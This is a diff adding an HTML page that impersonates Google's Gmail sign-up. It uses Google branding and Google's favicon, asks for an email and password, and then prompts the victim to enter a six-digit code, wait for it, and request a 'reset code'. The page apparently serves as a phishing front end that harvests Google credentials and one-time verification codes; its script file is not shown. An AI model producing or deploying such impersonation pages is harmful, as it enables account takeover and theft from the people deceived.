@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail Account Verification</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Gmail</h1>
+            <p>Create your Google Account</p>
+        </div>
+        
+        <div id="signupForm" class="content">
+            <div class="form-group">
+                <label for="email">Email address</label>
+                <input type="email" id="email" placeholder="you@gmail.com" required>
+                <div id="emailError" class="error-message">Please enter a valid Gmail address</div>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+            </div>
+            
+            <button class="btn" onclick="validateAndSubmit()">Create Account</button>
+            
+            <div class="footer">
+                By creating an account, you agree to Google's Terms of Service and Privacy Policy
+            </div>
+        </div>
+        
+        <div id="loadingSection" class="loading">
+            <div class="spinner"></div>
+            <p>Creating your account...</p>
+        </div>
+        
+        <div id="verificationSection" class="verification-section">
+            <h2>✓ Check your Gmail</h2>
+            <p>We've sent a 6-digit verification code to your email address. Please enter it below to complete your account setup.</p>
+            
+            <div class="code-input">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 1)">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 2)">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 3)">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 4)">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 5)">
+                <input type="text" maxlength="1" oninput="moveToNext(this, 6)">
+            </div>
+            
+            <div id="codeError" class="error-message">Invalid code. Attempts remaining: <span id="attempts">3</span></div>
+            <div id="codeSuccess" class="success-message">✓ Verification successful!</div>
+            
+            <div class="countdown" id="countdown">Wait 20 seconds and look for the code</div>
+            
+            <button class="btn" onclick="verifyCode()" style="margin-top: 20px;">Verify Code</button>
+            <button class="btn" onclick="sendResetCode()" style="margin-top: 10px; background: #34a853;">Send Reset Code</button>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
